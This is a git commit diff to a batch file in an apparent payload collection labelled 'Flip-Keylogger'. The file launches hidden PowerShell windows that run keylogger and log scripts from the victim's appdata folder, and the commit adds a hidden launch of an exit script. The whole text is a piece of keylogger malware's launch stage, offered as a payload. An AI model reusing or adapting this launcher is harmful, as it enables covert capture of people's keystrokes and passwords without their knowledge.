f432558595a238a572b39ce655aa95c2d3ab5373
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-24 22:55:24 -0600

    Update -p.cmd

--- Payloads/Flip-Keylogger/-p.cmd
+++ Payloads/Flip-Keylogger/-p.cmd
@@ -1,3 +1,4 @@
 @echo off
 powershell Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-keys.ps1"
 powershell Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-logs.ps1"
+powershell Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-exit.ps1"
